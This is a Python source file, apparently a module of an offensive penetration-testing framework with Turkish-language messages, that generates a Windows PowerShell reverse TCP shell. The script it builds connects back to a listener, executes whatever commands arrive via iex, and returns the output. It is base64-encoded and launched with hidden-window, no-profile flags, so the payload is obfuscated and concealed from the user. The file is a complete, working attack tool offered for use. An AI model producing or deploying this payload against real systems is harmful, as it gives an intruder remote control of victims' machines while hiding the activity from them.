from core.module import BaseModule
from core.option import Option
from typing import Dict, Any
import base64

class Payload(BaseModule):
    Name = "windows/powershell_reverse_tcp"
    Description = "PowerShell Reverse TCP Shell (Base64 Encoded)."
    Author = "Mahmut P."
    Category = "payloads"

    def __init__(self):
        super().__init__()
        self.Options = {
            "LHOST": Option("LHOST", "127.0.0.1", True, "Dinleyen IP."),
            "LPORT": Option("LPORT", 4444, True, "Dinleyen Port."),
            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: payload.ps1/bat).", completion_dir=".")
        }

    def generate(self) -> str:
        lhost = self.get_option_value("LHOST")
        lport = self.get_option_value("LPORT")

        # Basic PowerShell Reverse Shell
        raw_ps = f"""
$client = New-Object System.Net.Sockets.TcpClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}};
$client.Close();
"""
        # Encode to Base64 (UTF-16LE for PowerShell -encodedCommand)
        encoded_ps = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')
        
        command = f"powershell.exe -nop -w hidden -e {encoded_ps}"
        return command

    def run(self, options: Dict[str, Any]):
        code = self.generate()
        
        output_path = self.get_option_value("OUTPUT")
        if output_path:
            if not output_path.endswith(".ps1"):
                output_path += ".ps1"

            try:
                with open(output_path, "w") as f:
                    f.write(code)
                print(f"[*] Payload başarıyla kaydedildi: {output_path}")
                return f"Payload saved to {output_path}"
            except Exception as e:
                print(f"[!] Dosya yazma hatası: {e}")
                return code

        print(f"[*] PowerShell Payload (Base64 Encoded One-Liner):")
        print("-" * 50)
        print(code)
        print("-" * 50)
        return code
